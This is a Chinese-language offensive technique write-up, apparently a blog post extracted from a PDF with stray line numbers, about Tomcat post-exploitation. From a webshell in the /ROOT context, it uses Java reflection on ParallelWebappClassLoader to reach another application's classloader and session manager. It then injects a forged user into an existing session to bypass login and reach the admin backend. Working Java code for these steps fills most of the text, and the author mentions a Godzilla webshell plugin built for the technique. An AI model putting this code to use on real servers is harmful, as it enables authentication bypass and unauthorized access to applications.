遇到一个场景，当前/app路径下无法写入任何的jsp文件，但/ROOT下可以写，
但/ROOT/ 下写的无法直接Class.forName等操作/app/下的类。
测试发现tomcat的类加载器 ParallelWebappClassLoader 可获取到所有context
信息。
思路其实就是通过当前context获取到parent，也就是host，在基于host搜索其他
context，如下
this.getClass().getClassLoader().resources.context.parent.children
其实主要目的是找classloader，所以直接找到
this.getClass().getClassLoader().resources.context.parent.childClassLoaders
/manager 的类加载器可以看到没有任何class
而我们应用的则多上不少，破坏父类委派的表现。
代码实现如下
            ClassLoader classLoader = 
Thread.currentThread().getContextClassLoader();
            try {
                Object resources = 
getFieldValue(this.getClass().getClassLoader(), "resources");
                Map childClassLoaders = 
(Map)
                        getFieldValue(
                            getFieldValue(
                                getFieldValue(resources, 
"context"), 
                                "parent"),
                            "childClassLoaders");
                for (Map.Entry entry : 
childClassLoaders.entrySet()) {
                    if (entry.getValue().equals("/app")) {
                        classLoader = 
(ClassLoader)entry.getKey();
                        break;
                    }
                }
            } catch (Exception ignored) {
            }
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
    public static Object getFieldValue(Object obj, String 
fieldName) throws Exception {
        Field f = null;
        if (obj instanceof Field) {
            f = (Field)obj;
        } else {
            Method method = null;
            Class cs = obj.getClass();
            while(cs != null) {
                try {
                    f = cs.getDeclaredField(fieldName);
                    cs = null;
                } catch (Exception var6) {
                    cs = cs.getSuperclass();
                }
            }
        }
        f.setAccessible(true);
        return f.get(obj);
    }
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
又有个问题，我想绕过认证，直接生成有效session，分析了目标应用，他的认证
是将user写入到session中，那么session怎么跨context注入，我回头想我在context里找
一个已有的session就行了，没必要用当前使用的。
查了下资料，tomcat管理session的方式，有一个ConcurrentHashMap存储所有
session，一般是在context下，所以和上面思路一样
this.getClass().getClassLoader().resources.context.manager.sessions
遇到一个小bug，下面方法所在类的类加载器可能并不是
ParallelWebappClassLoader，所以需要搜索下父类，如下
    public  Object getSession(String id) throws  Exception {
        Object session = null;
        java.lang.ClassLoader classLoader = 
this.getClass().getClassLoader();
        int count = 0;
        while 
(!classLoader.getClass().getName().contains("ParallelWebappCla
ssLoader")) {
            classLoader = classLoader.getParent();
            if (count > 10) {
                break;
            }
            count += 1;
        }
        if (count > 10) {
1
2
3
4
5
6
7
8
9
10
11
12
上面还有个细节，用的是 this.getClass().getClassLoader() ，而不是
Thread.Current.getContextClassLoader() ，因为我如果在其他context下，虽
然把上面方法对应的类已经加载到指定context里，但
Thread.Current.getContextClassLoader() 仍然还是当前context，只有
this.getClass().getClassLoader() 才是加载此类上下文所对应的类加载器，
才能正确加载其他工具类，不然就报错，当然
this.getClass().getClassLoader() 可能就有个问题，就是这个classloader可能
不是 ParallelWebappClassLoader ，需要父类递归遍历下。
半自动化搜索也可以
            return session;
        }
        Object context = 
getFieldValue(getFieldValue(classLoader,"resources"), 
"context");
        Map sessions = (Map) 
getFieldValue(getFieldValue(context, "manager"), "sessions");
        for (Map.Entry entry: 
sessions.entrySet()) {
            if (id.equals(entry.getKey())) {
                session = getFieldValue(entry.getValue(), 
"facade");
            }
        }
        return session;
    }
13
14
15
16
17
18
19
20
21
22
23
24
25
//设置搜索类型包含Request关键字的对象
List keys = new ArrayList<>();
keys.add(new 
Keyword.Builder().setField_type("StandardSession").build());
//定义黑名单
//新建一个广度优先搜索Thread.currentThread()的搜索器
1
2
3
4
5
最终效果就如下，成功在/ROOT的webshell中，操作实际应用context的指定
session，注入伪造的user，从而绕过认证登录后台。（想到之前的vcenter，它还不一
样，是多个进程独立java运行，不存在这种情况，所以没法）
顺便编写了哥斯拉插件实现该功能。
SearchRequstByBFS searcher = new 
SearchRequstByBFS(Thread.currentThread(),keys);
// 设置黑名单
//打开调试模式,会生成log日志
searcher.setIs_debug(true);
//挖掘深度为20
searcher.setMax_search_depth(20);
//设置报告保存位置
searcher.setReport_save_path(".");
searcher.searchObject();
6
7
8
9
10
11
12
13
14